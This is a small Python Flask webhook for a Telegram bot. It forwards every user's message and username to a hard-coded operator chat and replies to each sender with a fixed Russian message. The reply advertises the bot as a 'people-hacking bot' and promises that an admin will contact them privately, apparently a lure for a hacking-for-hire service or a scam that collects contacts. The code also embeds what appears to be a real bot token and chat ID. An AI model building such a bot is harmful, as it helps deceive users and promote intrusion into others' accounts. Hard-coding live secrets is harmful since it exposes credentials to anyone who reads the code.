from flask import Flask, request
import requests

app = Flask(__name__)

BOT_TOKEN = "8851655567:AAEGziVSFXpZSAMD1hSjreZhP-OBfQUjvoc"
CHAT_ID = "8625787020"

TEXT = "Здравствуйте Я бот Взломщик людей😀 Скинь сюда текст как из видео прямо сюда к вам зайдет админ помощник🆘 в личные сообщения спустя полчаса - час удачи"

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    if data and 'message' in data:
        chat_id = data['message']['chat']['id']
        text = data['message'].get('text', '')
        username = data['message']['from'].get('username', 'anon')

        # Пересылка тебе
        msg = f"От @{username}: {text}"
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg}
        )

        # Ответ пользователю (и на /start, и на всё остальное)
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": chat_id, "text": TEXT}
        )

    return "ok", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
